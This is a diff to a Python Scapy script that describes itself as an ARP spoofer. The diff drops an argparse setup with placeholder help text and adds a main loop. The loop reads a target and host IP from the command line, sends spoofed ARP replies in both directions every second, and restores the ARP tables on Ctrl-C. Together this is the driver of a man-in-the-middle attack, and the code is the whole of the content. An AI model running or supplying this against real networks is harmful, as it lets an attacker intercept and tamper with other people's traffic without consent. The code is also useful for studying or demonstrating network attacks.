@@ -22,13 +22,16 @@ def restore(target_ip, host_ip, verbose=True):
     if verbose:
         print(f"[+] Send to {target_ip}: {host_ip} is-at {host_mac}")
 
-parser = argparse.ArgumentParser(
-    description="ARP spoofer using Python and Scapy",
-    formatter_class=argparse.RawDescriptionHelpFormatter,
-    epilog=textwrap.dedent('''Example:
-        Lorem Ipsum Docet
-'''))
-
-parser.add_argument('-o', '--host', action='store', help='Specify host ip address')
-parser.add_argument('-t', '--target', action='store', help='Specify target ip')
-parser.add_argument('-v', '--verbose', action='store_true', help='Activate verbose mode')
+if __name__ == "__main__":
+    target = sys.argv[1]
+    host = sys.argv[2]
+    Verbose = True
+    try:
+        while True:
+            spoof(target, host, Verbose)
+            spoof(host, target, Verbose)
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("[!] Detected CTRL-C, restoring network...")
+        restore(target, host)
+        restore(host, target)
